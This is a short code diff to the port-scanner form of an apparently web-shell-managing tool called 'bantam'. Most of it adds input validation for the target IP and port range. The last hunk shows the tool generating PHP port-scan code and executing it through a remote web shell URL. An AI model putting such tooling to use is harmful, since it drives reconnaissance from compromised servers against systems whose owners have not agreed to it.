@@ -10,6 +10,11 @@ namespace bantam.Forms
         /// <summary>
         /// 
         /// </summary>
+        private const int PORT_MAX = 65535;
+
+        /// <summary>
+        /// 
+        /// </summary>
         public DistributedPortScanner()
         {
             InitializeComponent();
@@ -34,25 +39,26 @@ namespace bantam.Forms
         /// <param name="e"></param>
         private async void btnScan_Click(object sender, EventArgs e)
         {
-            //todo uri / ip check?
+            //todo UI THINGS
             if (string.IsNullOrEmpty(textBoxTarget.Text)) {
                 return;
-                //todo ui thing
+            }
+
+            if (!Helper.IsValidIP(textBoxTarget.Text)) {
+                return;
             }
 
             if (string.IsNullOrEmpty(textBoxStartPort.Text)
              || string.IsNullOrEmpty(textBoxEndPort.Text)) {
-                //todo ui thing
                 return;
             }
 
-            //todo port validation?
             int startPort = Convert.ToInt32(textBoxStartPort.Text);
             int endPort = Convert.ToInt32(textBoxEndPort.Text);
 
             if (startPort > endPort 
-             || endPort == 0 || startPort == 0) {
-                //todo ui thing
+             || endPort <= 0 || startPort <= 0
+             || startPort > PORT_MAX || endPort > PORT_MAX) {
                 return;
             }
 
@@ -93,7 +99,7 @@ namespace bantam.Forms
                 string responseText = "[" + shellUrl + "] - returned ports (" + scannedRange + ") - \r\n";
                 string phpCode = PhpBuilder.PortScanner(textBoxTarget.Text, portsCode, encryptResponse);
 
-                BantamMain.ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL, rtb, responseText);
+                BantamMain.ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL, false, rtb, responseText);
 
                 btnScan.Enabled = true;
             }
